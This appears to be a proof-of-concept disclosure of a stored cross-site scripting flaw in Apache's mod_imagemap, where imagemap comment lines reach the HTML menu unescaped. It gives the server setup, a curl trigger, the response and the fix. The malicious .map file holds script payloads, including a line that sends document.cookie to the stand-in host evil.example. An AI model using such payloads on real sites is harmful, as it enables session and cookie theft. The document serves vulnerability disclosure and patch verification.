# PoC 167 — Unescaped Imagemap Comments in HTML Menu (mod_imagemap)

Comment lines from a `.map` file are emitted into the generated HTML menu
without HTML escaping when `ImapMenu semiformatted` or `unformatted` is set,
producing stored HTML/script injection in a same-origin response.

## Setup

Module: `mod_imagemap`.

`/tmp/167/httpd.conf`:

```apache
ServerRoot /tmp/167
Listen 127.0.0.1:8167
PidFile  /tmp/167/httpd.pid
ErrorLog /tmp/167/error.log
LoadModule mpm_event_module      modules/mod_mpm_event.so
LoadModule unixd_module          modules/mod_unixd.so
LoadModule authz_core_module     modules/mod_authz_core.so
LoadModule mime_module           modules/mod_mime.so
LoadModule imagemap_module       modules/mod_imagemap.so
DocumentRoot /tmp/167/htdocs

ImapMenu semiformatted
ImapDefault nocontent
ImapBase referer

AddHandler imap-file .map
```

`/tmp/167/htdocs/poc.map` (the malicious comments are the payload — in the
threat model the map is editable by an upload form, a misconfigured
`AllowOverride`, or a partial site compromise):

```text
#<script>alert(document.domain)</script>
#<img src=x onerror="fetch('//evil.example/'+document.cookie)">
default /
rect /safe.html 0,0 10,10 "safe link"
```

## Trigger

A request without coordinates (or with `0,0`) sets `showmenu` and forces
the menu rendering branch:

```sh
httpd -f /tmp/167/httpd.conf
curl -i 'http://127.0.0.1:8167/poc.map'
```

## Observed effect

The response body is `text/html` and contains the comment payload verbatim,
because before the patch `menu_comment()` writes the stripped comment with
`ap_rvputs(r, comment, "\n", NULL)`:

```text
HTTP/1.1 200 OK
Content-Type: text/html; charset=ISO-8859-1

<HTML><HEAD>
<TITLE>Menu for /poc.map</TITLE>
</HEAD><BODY>
<H1>Menu for /poc.map</H1>
<HR>

<script>alert(document.domain)</script>
<img src=x onerror="fetch('//evil.example/'+document.cookie)">
<a href="/safe.html">safe link</a>
<HR>
</BODY></HTML>
```

Loading the URL in any browser executes `alert(document.domain)` in the
origin of the httpd vhost, confirming script execution from the server's
own origin (cookies, same-origin XHR, etc. all available to the payload).

After the patch the comments are passed through `ap_escape_html()` before
`ap_rvputs()`, and the response body contains the inert text:

```text
&lt;script&gt;alert(document.domain)&lt;/script&gt;
&lt;img src=x onerror=&quot;...&quot;&gt;
```

## Cleanup

```sh
kill $(cat /tmp/167/httpd.pid) 2>/dev/null
rm -rf /tmp/167
```
